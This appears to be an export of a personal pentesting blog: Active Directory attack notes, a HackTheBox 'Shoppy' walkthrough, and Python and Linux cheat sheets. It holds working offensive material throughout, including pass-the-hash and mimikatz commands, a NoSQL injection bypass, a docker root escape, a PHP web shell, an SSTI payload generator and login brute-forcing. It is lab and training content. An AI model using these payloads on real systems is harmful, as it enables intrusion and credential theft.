spookysec.local\\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0 spookysec.local\\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8 spookysec.local\\paradox:des-cbc-md5:83988983f8b34019 spookysec.local\\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347 spookysec.local\\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa spookysec.local\\Muirland:des-cbc-md5:cb8a4a3431648c86 spookysec.local\\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166 spookysec.local\\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c spookysec.local\\horshark:des-cbc-md5:a823497a7f4c0157 spookysec.local\\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518 spookysec.local\\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff spookysec.local\\svc-admin:des-cbc-md5:2c4543ef4646ea0d spookysec.local\\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922 spookysec.local\\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197 spookysec.local\\backup:des-cbc-md5:d601e9469b2f6d89 spookysec.local\\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242 spookysec.local\\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68 spookysec.local\\a-spooks:des-cbc-md5:e09e4683ef4a4ce9 ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:bffdeb6a82c14f54f42314c25a52ab2cdee565388e75aae56142c72b998c02ae ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:8ae5e67079cf0568a83755b55afa22d1 ATTACKTIVEDIREC$:des-cbc-md5:76ef51454394df8f [*] Cleaning up... Pass the Hash [psexec.py]\u003e Pass the Hash [psexec.py] # \u0026gt; psexec.py Administrator@10.10.152.60 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc Impacket v0.10.1.dev1+20221214.172823.8799a1a - Copyright 2022 Fortra [*] Requesting shares on 10.10.152.60..... [*] Found writable share ADMIN$ [*] Uploading file DMoYDhmb.exe [*] Opening SVCManager on 10.10.152.60..... [*] Creating service sVHQ on 10.10.152.60..... [*] Starting service sVHQ..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.1490] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; Pass the Hash [Evil-WinRM]\u003e Pass the Hash [Evil-WinRM] # \u0026gt; evil-winrm -i 10.10.152.60 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc Evil-WinRM shell v3.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; Sharphound\u003e Sharphound # .\\Sharphound.exe -c all,gpolocalgroup xfreerdp\u003e xfreerdp # \u0026gt; xfreerdp /v:10.10.80.102 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp /v:10.10.80.102 \u0026ndash; this is where we specify what we want to connect to. /u:USERNAME /p:PASSWORD \u0026ndash; here we would substitute in a valid username/password combination. /cert:ignore \u0026ndash; RDP connections are encrypted. If our attacking machine doesn\u0026rsquo;t recognise the certificate presented by the machine we are connecting to it will warn us and ask if we wish to proceed; this switch simply ignores that warning automatically. +clipboard \u0026ndash; this shares our clipboard with the target, allowing us to copy and paste between our attacking machine and the target machine. /dynamic-resolution lets us resize the GUI window, adjusting the resolution of our remote session automatically. /drive:share,/tmp \u0026ndash; our final switch, this shares our own /tmp directory with the target. This is an extremely useful trick as it allows us to execute scripts and programs from our own machine without actually transferring them to the target (we will see this in action later!) This is how we need to import powershell scripts.(because /drive:share,/tmp)\n. \\\\tsclient\\share\\CVE-2021-1675\\CVE-2021-1675.ps1 This is how we need to run a file from the /tmp share of our local machine.\n\u0026gt; \\\\tsclient\\share\\x64\\mimikatz.exe WinPEAS\u003e WinPEAS # Windows Privilege Escalation Awesome Scripts.\nSeatbelt\u003e Seatbelt # Similar to WinPEAS.\nStart a new high-integrity command prompt\u003e Start a new high-integrity command prompt # \u0026gt; Start-Process powershell \u0026#39;Start-Process cmd -Verb RunAs\u0026#39; -Credential adm1n Mimikatz\u003e Mimikatz # When we start Mimikatz we usually have to execute two commands before we start dumping hashes:\nprivilege::debug \u0026ndash; this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for \u0026ldquo;debugging\u0026rdquo; purposes. token::elevate \u0026ndash; simply put, this takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges. This is something that we have a right to do as an administrator, but that is not usually possible using normal Windows operations. lsadump::sam \u0026ndash; When executed, this will provide us with a list of password hashes for every account on the machine (with some extra information thrown in as well). The Administrator account password hash should be fairly near the top of the list. ","date":"18 January 2023","permalink":"/posts/notes/windows/","section":"Posts","summary":"enum4linux\u003e enum4linux # \u0026gt; enum4linux [options] ip Usage: /usr/bin/enum4linux [options] ip Options are (like \u0026#34;enum\u0026#34;): -U get userlist -M get machine list* -S get sharelist -P get password policy information -G get group and member list -d be detailed, applies to -U and -S -u user specify username to use (default \u0026#34;\u0026#34;) -p pass specify password to use (default \u0026#34;\u0026#34;) The following options from enum.","title":"Active Directory"},{"content":"","date":"18 January 2023","permalink":"/tags/notes/","section":"Tags","summary":"","title":"Notes"},{"content":"","date":"14 January 2023","permalink":"/tags/docker/","section":"Tags","summary":"","title":"Docker"},{"content":"","date":"14 January 2023","permalink":"/tags/ghidra/","section":"Tags","summary":"","title":"Ghidra"},{"content":" Name: Shoppy IP: 10.10.11.180 Defficulty: Easy OS: Linux Author: lockscan Nmap\u003e Nmap # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApZi3Kltv1yDHTatw6pKZfuIcoHfTnVe0W1yc9Uw7NMUinxjjQaQ731J+eCTwd8hBcZT6HQwcchDNR50Lwyp2a/KpXuH2my+2/tDvISTRTgwfMy1sDrG3+KPEzBag07m7ycshp8KhrRq0faHPrEgcagkb5T8mnT6zr3YonzoMyIpT+Q1O0JAre6GPgJc9im/tjaqhwUxCH5MxJCKQxaUf2SlGjRCH5/xEkNO20BEUYokjoAWwHUWjK2mlIrBQfd4/lcUzMnc5WT9pVBqQBw+/7LbFRyH4TLmGT9PPEr8D8iygWYpuG7WFOZlU8oOhO0+uBqZFgJFFOevq+42q42BvYYR/z+mFox+Q2lz7viSCV7nBMdcWto6USWLrx1AkVXNGeuRjr3l0r/698sQjDy5v0GnU9cMHeYkMc+TuiIaJJ5oRrSg/x53Xin1UogTnTaKLNdGkgynMqyVFklvdnUngRSLsXnwYNgcDrUhXxsfpDu8HVnzerT3q27679+n5ZFM= | 256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHiKrH/B/4murRCo5ju2KuPgkMjQN3Foh7EifMHEOwmoDNjLYBfoAFKgBnrMA9GzA+NGhHVa6L8CAxN3eaGXXMo= | 256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsWhJQCRHjDkHy3HkFLMZoGqCmM3/VfMHMm56u0Ivk 80/tcp open http syn-ack nginx 1.23.1 |_http-server-header: nginx/1.23.1 |_http-title: Did not follow redirect to http://shoppy.htb | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 9093/tcp open copycat? syn-ack | fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/plain; version=0.0.4; charset=utf-8 | Date: Wed, 11 Jan 2023 03:10:11 GMT | HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime. | TYPE go_gc_cycles_automatic_gc_cycles_total counter | go_gc_cycles_automatic_gc_cycles_total 166 | HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application. | TYPE go_gc_cycles_forced_gc_cycles_total counter | go_gc_cycles_forced_gc_cycles_total 0 | HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles. | TYPE go_gc_cycles_total_gc_cycles_total counter | go_gc_cycles_total_gc_cycles_total 166 | HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles. | TYPE go_gc_duration_seconds summary | go_gc_duration_seconds{quantile=\u0026#34;0\u0026#34;} 3.8121e-05 | go_gc_duration_seconds{quantile=\u0026#34;0.25\u0026#34;} 6.9631e-05 | go_gc | HTTPOptions: | HTTP/1.0 200 OK | Content-Type: text/plain; version=0.0.4; charset=utf-8 | Date: Wed, 11 Jan 2023 03:10:12 GMT | HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime. | TYPE go_gc_cycles_automatic_gc_cycles_total counter | go_gc_cycles_automatic_gc_cycles_total 166 | HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application. | TYPE go_gc_cycles_forced_gc_cycles_total counter | go_gc_cycles_forced_gc_cycles_total 0 | HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles. | TYPE go_gc_cycles_total_gc_cycles_total counter | go_gc_cycles_total_gc_cycles_total 166 | HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles. | TYPE go_gc_duration_seconds summary | go_gc_duration_seconds{quantile=\u0026#34;0\u0026#34;} 3.8121e-05 | go_gc_duration_seconds{quantile=\u0026#34;0.25\u0026#34;} 6.9631e-05 |_ go_gc # Keyspace Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Three ports are open.\n22/TCP SSH OpenSSH 8.4p1 And its banner says that this is a Debian box 80/TCP HTTP nginx/1.23.1 Add shoppy.htb into /etc/hosts 9093/TCP Copycat Copycat is a database replication service. We are not going to utilize it in this box therefore I\u0026rsquo;m not going to describe further more about it. Web Enumeration\u003e Web Enumeration # Subdomain Fuzzing\u003e Subdomain Fuzzing # Found one subdomain\nmattermost [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 86ms] Add mattermost.shoppy.htb into /etc/hosts\nIf we head over to mattermost.shoppy.htb, we can see a login form. Since we don\u0026rsquo;t have any credentials yet, we can skip this for now.\nDirectory Fuzzing\u003e Directory Fuzzing # Found two interesting directories under http://shoppy.htb\n[09:04:03] 302 - 28B - /admin/ -\u0026gt; /login [09:04:40] 200 - 1KB - /login I couldn\u0026rsquo;t find any directories under http://mattermost.shoppy.htb except for robots.txt which has nothing interesting within it.\nShoppy.htb/login\u003e Shoppy.htb/login # It\u0026rsquo;s a login form for admin. So we can asume admin as an possible username.\nAfter a while I tried to fuzz the username parameter with some NoSQL Payloads and found a working payload.\nffuf -request login.req -request-proto http -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt -c -r -mc all Exploit the NoSQLi and login to shoppy.htb\nIn http://shoppy.htb/admin/search-users we can search for users. And if we search for admin, it gives us a export-report.json which contains id, username and MD5 password hash of the admin user. But we don\u0026rsquo;t need admin credentials anymore thus we need to find if is there are any other existing users are in this site or not.\nSo to do that, instead of searching for admin, we can search for admin' || 'a'=='a (the payload we used to login to the site) and leak the database. With that we can find a username josh and his MD5 password hash.\n[ { \u0026#34;_id\u0026#34;:\u0026#34;62db0e93d6d6a999a66ee67a\u0026#34;, \u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;23c6877d9e2b564ef8b32c3a23de27b2\u0026#34; }, { \u0026#34;_id\u0026#34;:\u0026#34;62db0e93d6d6a999a66ee67b\u0026#34;, \u0026#34;username\u0026#34;:\u0026#34;josh\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;6eb**************************995\u0026#34; } ] Let\u0026rsquo;s crack it and find the user josh\u0026rsquo;s password.\njohn hash --format=raw-md5 -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3]) Warning: no OpenMP support for this hash type, consider --fork=4 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status josh:rem***********way 1 password hash cracked, 0 left Foothold\u003e Foothold # Since we have the user josh\u0026rsquo;s credentials and the fact that we are already the admin of the shoppy.htb, we don\u0026rsquo;t need to try josh credentials on shoppy.htb anymore. Therefore we can try those credentials on mattermost.shoppy.htb. It worked and now we are in http://mattermost.shoppy.htb/shoppy/channels/deploy-machine direcroty and it seems like a group chat or something like that. And right away we can notice a message containing credentials for user called jaeger.\nHey @josh, For the deploy machine, you can create an account with these creds : username: jaeger password: Sh0********pp! And deploy on it. And we can see that josh has already replied to that message and we can assume that josh has already created that account.\nAnd we can also see they are usign docker to deployment. So we might be able to take advantage of it later.\nOh I forgot to tell you, that we\u0026#39;re going to use docker for the deployment, so I will add it to the first deploy Let\u0026rsquo;s login to the box via SSH with jaeger\u0026rsquo;s credentials and capture the user flag.\njaeger@shoppy:~$ whoami jaeger jaeger@shoppy:~$ id uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger) jaeger@shoppy:~$ cat user.txt 51d**************************c60 Privesc [Deploy]\u003e Privesc [Deploy] # User jaeger can run /home/deploy/password-manager as the user deploy with no password.\njaeger@shoppy:~$ sudo -l [sudo] password for jaeger: Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager When we execute /home/deploy/password-manager, it asks us for a master password.\njaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: syclops Access denied! This incident will be reported ! So I wanted to analyze /home/deploy/password-manager a little bit more. So I downloaded it to my local machine and open it with ghidra.\nIn the main function I saw it is forming a word Sample letter by letter before it compares with users input.\nbool main(void) { int iVar1; basic_ostream *pbVar2; basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; local_68 [32]; basic_string local_48 [47]; allocator\u0026lt;char\u0026gt; local_19 [9]; pbVar2 = std::operator\u0026lt;\u0026lt;((basic_ostream *)std::cout,\u0026#34;Welcome to Josh password manager!\u0026#34;); std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)pbVar2, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); std::operator\u0026lt;\u0026lt;((basic_ostream *)std::cout,\u0026#34;Please enter your master password: \u0026#34;); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(); /* Keyspace */ std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator+= (local_68,\u0026#34;S\u0026#34;); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator+= (local_68,\u0026#34;a\u0026#34;); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator+= (local_68,\u0026#34;m\u0026#34;); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator+= (local_68,\u0026#34;p\u0026#34;); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator+= (local_68,\u0026#34;l\u0026#34;); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator+= (local_68,\u0026#34;e\u0026#34;); iVar1 = std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::compare (local_48); if (iVar1 != 0) { pbVar2 = std::operator\u0026lt;\u0026lt;((basic_ostream *)std::cout, \u0026#34;Access denied! This incident will be reported !\u0026#34;); std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)pbVar2, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); } else { pbVar2 = std::operator\u0026lt;\u0026lt;((basic_ostream *)std::cout,\u0026#34;Access granted! Here is creds !\u0026#34;); std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)pbVar2, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); system(\u0026#34;cat /home/deploy/creds.txt\u0026#34;); } std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string (local_68); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string ((basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; *)local_48); return iVar1 != 0; So now I\u0026rsquo;m certain that Sample is the master password for /home/deploy/password-manager. Let\u0026rsquo;s try it on the box now.\nIt worked and I got the SSH credentials for the user deploy.\njaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Dep*******pp! Log into the box via SSH as the deploy user.\nPrivesc [Root]\u003e Privesc [Root] # $ whoami deploy $ id uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker) As you can see, now we have elevated our privileges to deploy user. And if you look closely to the output of the id command, you can see that the deploy user is also in the docker group. So that means now we could be able to run docker binary.\nIf we look into gtfobins.github.io for docker binay, you can see there is a way we can use docker to get a root shell.\n$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh # whoami root # id uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo) # cat /root/root.txt 7a9**************************6e9 ","date":"14 January 2023","permalink":"/posts/htb/shoppy/","section":"Posts","summary":"Name: Shoppy IP: 10.10.11.180 Defficulty: Easy OS: Linux Author: lockscan Nmap\u003e Nmap # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApZi3Kltv1yDHTatw6pKZfuIcoHfTnVe0W1yc9Uw7NMUinxjjQaQ731J+eCTwd8hBcZT6HQwcchDNR50Lwyp2a/KpXuH2my+2/tDvISTRTgwfMy1sDrG3+KPEzBag07m7ycshp8KhrRq0faHPrEgcagkb5T8mnT6zr3YonzoMyIpT+Q1O0JAre6GPgJc9im/tjaqhwUxCH5MxJCKQxaUf2SlGjRCH5/xEkNO20BEUYokjoAWwHUWjK2mlIrBQfd4/lcUzMnc5WT9pVBqQBw+/7LbFRyH4TLmGT9PPEr8D8iygWYpuG7WFOZlU8oOhO0+uBqZFgJFFOevq+42q42BvYYR/z+mFox+Q2lz7viSCV7nBMdcWto6USWLrx1AkVXNGeuRjr3l0r/698sQjDy5v0GnU9cMHeYkMc+TuiIaJJ5oRrSg/x53Xin1UogTnTaKLNdGkgynMqyVFklvdnUngRSLsXnwYNgcDrUhXxsfpDu8HVnzerT3q27679+n5ZFM= | 256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHiKrH/B/4murRCo5ju2KuPgkMjQN3Foh7EifMHEOwmoDNjLYBfoAFKgBnrMA9GzA+NGhHVa6L8CAxN3eaGXXMo= | 256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsWhJQCRHjDkHy3HkFLMZoGqCmM3/VfMHMm56u0Ivk 80/tcp open http syn-ack nginx 1.","title":"HackTheBox Shoppy"},{"content":"","date":"14 January 2023","permalink":"/tags/nosql/","section":"Tags","summary":"","title":"NoSQL"},{"content":"","date":"7 January 2023","permalink":"/tags/python/","section":"Tags","summary":"","title":"Python"},{"content":"Take Advantage Of input() Function And Run System Commands Within It\n__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat /etc/passwd\u0026#39;) Easy SSTI Payloads Generator\nGitHub Source\n#!/usr/bin/python3 from cmd import Cmd import urllib.parse, argparse parser = argparse.ArgumentParser(description=\u0026#34;Generate SSTI payloads... One character at a time.\u0026#34;) parser.add_argument(\u0026#34;-u\u0026#34;,\u0026#34;--url-encode\u0026#34;, action=\u0026#34;store_true\u0026#34;, help=\u0026#34;URL Encode\u0026#34;) args = parser.parse_args() url_encode=args.url_encode class Terminal(Cmd): prompt=\u0026#39;\\033[1;33mCommand ==\u0026gt;\\033[0m \u0026#39; def decimal_encode(self,args): command=args decimals=[] for i in command: decimals.append(str(ord(i))) payload=\u0026#39;\u0026#39;\u0026#39;${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)\u0026#39;\u0026#39;\u0026#39; % decimals[0] for i in decimals[1:]: line=\u0026#39;.concat(T(java.lang.Character).toString({}))\u0026#39;.format(i) payload+=line payload+=\u0026#39;).getInputStream())}\u0026#39; if url_encode: payload_encoded=urllib.parse.quote_plus(payload,safe=\u0026#39;\u0026#39;) return payload_encoded else: return payload def default(self,args): print(self.decimal_encode(args)) print() try: term=Terminal() term.cmdloop() except KeyboardInterrupt: quit() ","date":"7 January 2023","permalink":"/posts/notes/python/python/","section":"Posts","summary":"Take Advantage Of input() Function And Run System Commands Within It\n__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat /etc/passwd\u0026#39;) Easy SSTI Payloads Generator\nGitHub Source\n#!/usr/bin/python3 from cmd import Cmd import urllib.parse, argparse parser = argparse.ArgumentParser(description=\u0026#34;Generate SSTI payloads.","title":"Python"},{"content":"","date":"7 January 2023","permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux"},{"content":"View Cron Jobs\u003e View Cron Jobs # crontab -l List Scheduled Processes/Tasks/Scripts\u003e List Scheduled Processes/Tasks/Scripts # systemctl list-timers View NFS (Network File Share)\u003e View NFS (Network File Share) # showmount REMOTE_IP -e Mount NFS\u003e Mount NFS # mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files\u003e Crack ZIP Files # fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries\u003e Find SUID Binaries # find / -type f -perm -4000 2\u0026gt;/dev/null PHP WebShell\u003e PHP WebShell # \u0026lt;?php system($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; SMB Shares\u003e SMB Shares # smbmap -H REMOTE_IP -u USERNAME Basic Chisel Port Forwarding\u003e Basic Chisel Port Forwarding # Server\u003e Server # ./chisel server --reverse --port LOCAL_PORT Client\u003e Client # ./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT Find Open Ports\u003e Find Open Ports # netstat -tupln OS/Kernel Information\u003e OS/Kernel Information # uname -a cat /proc/version cat /etc/issue CPU Information\u003e CPU Information # lscpu Identifying the Network Route\u003e Identifying the Network Route # route ip route Discover Other IP Address On A Network\u003e Discover Other IP Address On A Network # arp -a ip neigh Look For A Specific String In The File System\u003e Look For A Specific String In The File System # grep --color=auto -rnw \u0026#39;/\u0026#39; -ie \u0026#34;STRING_THAT_WANT_BE_FOUND\u0026#34; --color=always 2\u0026gt; /dev/null find . -type f -exec grep -i -I \u0026#34;STRING_THAT_WANT_BE_FOUND\u0026#34; {} /dev/null \\; Find Passwords in History\u003e Find Passwords in History # cat ~/.bash_history | grep -i passw Cracking Linux(bcrypt) Password\u003e Cracking Linux(bcrypt) Password # unshadow PASSWD_FILE SHADOW_FILE \u0026gt; unshadowed.txt hashcat -m 1800 unshadowed.txt /PATH/TO/WORDLIST -O NSLookup\u003e NSLookup # nslookup is a network administration command-line tool for querying the Domain Name System to obtain the mapping between the domain name and IP address or other DNS records.\nnslookup -type=any DOMAIN.COM DNSRecon\u003e DNSRecon # DNSRecon is a Python script that provides the ability to perform: Check all NS Records for Zone Transfers. Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF, and TXT). Perform common SRV Record Enumeration. Top Level Domain (TLD) Expansion.\ndnsrecon -d DOMAIN.COM -D /PATH/TO/SUBDMAIN/WORDLIST -t brt Git-Dumper\u003e Git-Dumper # A tool to dump a git repository from a website.\ngit-dumper http://SITENAME.COM/.git LDAPSearch\u003e LDAPSearch # LDAPSearch is a shell-accessible interface to the ldap_search_ext(3) library call.\nldapsearch -D binddn\\\\ldap -H ldap://REMOTE_IP -w \u0026#39;PASSWORD\u0026#39; ldapsearch -D binddn\\\\ldap -H ldap://REMOTE_IP -w \u0026#39;PASSWORD\u0026#39; | grep name: | sed \u0026#39;s/^name: //\u0026#39; | grep -vE \u0026#39;D|C|A|U\u0026#39; \u0026gt; /PATH/TO/USERNAMES/WORDLIST WhatWeb\u003e WhatWeb # WhatWeb identifies websites. It recognizes web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.\nwhatweb https://DOMAIN/ ARPScan\u003e ARPScan # ARP-SCAN is a command-line tool that uses the ARP protocol to discover and fingerprint IP hosts on the local network.\nsudo arp-scan -l NetDiscover\u003e NetDiscover # Netdiscover is an active/passive address reconnaissance tool, mainly developed for those wireless networks without a DHCP server when you are wardriving. Similar to ARP-SCAN.\nsudo netdiscover -r IP/24 SMBClient\u003e SMBClient # SMBCLIENT is a client that can \u0026rsquo;talk\u0026rsquo; to an SMB/CIFS server. It offers an interface similar to that of the FTP program.\nsmbclient -L \\\\\\\\REMOTE_IP\\\\ SSH\u003e SSH # OpenSSH is the premier connectivity tool for remote login with the SSH protocol.\nssh REMOTE_IP -o KexAlgorithms=+diffie-helman-group1-sha1 -c aex128-cbc Evil-WinRM\u003e Evil-WinRM # This shell is the ultimate WinRM shell for hacking/pen testing. WinRM (Windows Remote Management) is the Microsoft implementation of the WS-Management Protocol.\nevil-winrm -i IP_ADDRESS -u username -p password FFUF\u003e FFUF # ffuf · Fast web fuzzer written in Go.\nffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://www.vulnbegin.co.uk/FUZZ -H \u0026#34;Cookie:ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9\u0026#34; -t 1 -p 0.1 -mc all -fc 404 -c It can be also used to brute-force login forms.\nffuf -w ~/wordlists/usernames.txt -X POST -d \u0026#34;username=FUZZ\u0026amp;password=x\u0026#34; -t 1 -p 0.1 -H \u0026#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9\u0026#34; -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; -u http://www.vulnbegin.co.uk/cpadmin/login -fr \u0026#39;Username is invalid\u0026#39; ffuf -w ~/wordlists/passwords.txt -X POST -d \u0026#34;username=admin\u0026amp;password=FUZZ\u0026#34; -t 1 -p 0.1 -H \u0026#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9\u0026#34; -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; -u http://www.vulnbegin.co.uk/cpadmin/login -fr \u0026#39;Password is invalid\u0026#39; And also for id fuzzing.\nseq 1 100 | ffuf -w - -t 1 -p 0.1 -H 